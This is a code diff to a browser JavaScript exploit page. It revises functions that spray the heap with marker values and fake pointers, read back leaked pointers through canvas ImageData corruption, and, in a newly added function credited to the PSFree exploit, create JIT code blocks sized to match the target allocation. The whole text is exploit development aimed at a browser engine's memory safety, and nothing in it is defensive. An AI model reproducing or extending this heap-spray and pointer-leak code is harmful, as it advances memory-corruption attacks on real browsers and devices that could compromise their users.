@@ -37,24 +37,22 @@
             for (let i = 0; i < 500; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
-            const extraBuffers = [];
             for (let i = 0; i < 100; i++) {
-                extraBuffers.push(new ArrayBuffer(2 * 1024 * 1024));
+                new ArrayBuffer(2 * 1024 * 1024);
             }
         }
 
         function sprayHeap() {
             const arrays = [];
-            const targetSize = 512 * 512 * 4; // Match ImageData size
+            const targetSize = 512 * 512 * 4; // ImageData size
             for (let i = 0; i < 20000; i++) {
                 const buf = new ArrayBuffer(targetSize);
                 const view = new Uint32Array(buf);
-                // Fill with identifiable pattern and fake pointer
                 for (let j = 0; j < view.length; j += 4) {
-                    view[j] = 0x41424344; // 'ABCD'
-                    view[j + 1] = 0x12345678; // Fake pointer low
-                    view[j + 2] = 0x87654321; // Fake pointer high
-                    view[j + 3] = i; // Buffer index
+                    view[j] = 0x41424344; // ABCD
+                    view[j + 1] = 0x12345678; // Fake ptr low
+                    view[j + 2] = 0x87654321; // Fake ptr high
+                    view[j + 3] = i; // Index
                 }
                 arrays.push({ buffer: buf, view: new Uint8Array(buf) });
             }
@@ -98,11 +96,10 @@
                 for (let i = 0; i < view.length && i < 64; i += 4) {
                     if (view[i] === 0x41424344) {
                         leaked += `Leaked at offset ${i * 4}: ABCD pattern\n`;
-                        leaked += `Fake ptr: 0x${view[i + 1].toString(16)} 0x${view[i + 2].toString(16)}\n`;
+                        leaked += `Ptr: 0x${view[i + 1].toString(16)} 0x${view[i + 2].toString(16)}\n`;
                         leaked += `Buffer index: ${view[i + 3]}\n`;
-                        // Check for real pointer
-                        if (view[i + 1] !== 0x12345678 && view[i + 2] !== 0x87654321) {
-                            leaked += `Possible real ptr: 0x${view[i + 2].toString(16)}${view[i + 1].toString(16)}\n`;
+                        if (view[i + 1] !== 0x12345678 || view[i + 2] !== 0x87654321) {
+                            leaked += `Real ptr: 0x${view[i + 2].toString(16)}${view[i + 1].toString(16)}\n`;
                         }
                     }
                 }
@@ -115,12 +112,11 @@
             const newData = new Uint8Array(imageData.data.length);
             const fakePtr = [0x11223344, 0x55667788]; // Test pointer
             for (let i = 0; i < newData.length; i += 16) {
-                newData[i] = 0x99; newData[i + 1] = 0x99; // Marker
+                newData[i] = 0x99; newData[i + 1] = 0x99;
                 newData.set(new Uint8Array(new Uint32Array(fakePtr).buffer), i + 4);
             }
             imageData.data.set(newData);
             ctx.putImageData(imageData, 0, 0);
-            // Check sprayed buffers
             for (let i = 0; i < sprayed.length; i++) {
                 const view = sprayed[i].view;
                 if (view[0] === 0x99 && view[1] === 0x99) {
@@ -129,6 +125,22 @@
                 }
             }
             return null;
+        }
+
+        function createCodeBlock() {
+            const funcs = [];
+            const consLen = 512 * 512 * 4 - 8 * 5; // Match ImageData size
+            let src = 'var f = 0x11223344;\n';
+            for (let i = 0; i < consLen; i += 8) {
+                src += `var a${i} = ${100 + i};\n`;
+            }
+            src += 'return [];\n';
+            for (let i = 0; i < 100; i++) {
+                const f = new Function(src);
+                f();
+                funcs.push(f);
+            }
+            return funcs;
         }
 
         function triggerExploit() {
@@ -141,6 +153,9 @@
                 for (let i = 0; i < refImageData.data.length; i++) {
                     refImageData.data[i] = 0x46;
                 }
+
+                // Create CodeBlock (inspired by PSFree)
+                const funcs = createCodeBlock();
 
                 // Spray heap
                 const sprayed = sprayHeap();
@@ -187,7 +202,7 @@
 
                     status.textContent = 'Exploit attempted!';
                     clearInterval(drawInterval);
-                }, 150);
+                }, 100);
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = `Failed: ${err.message}`;
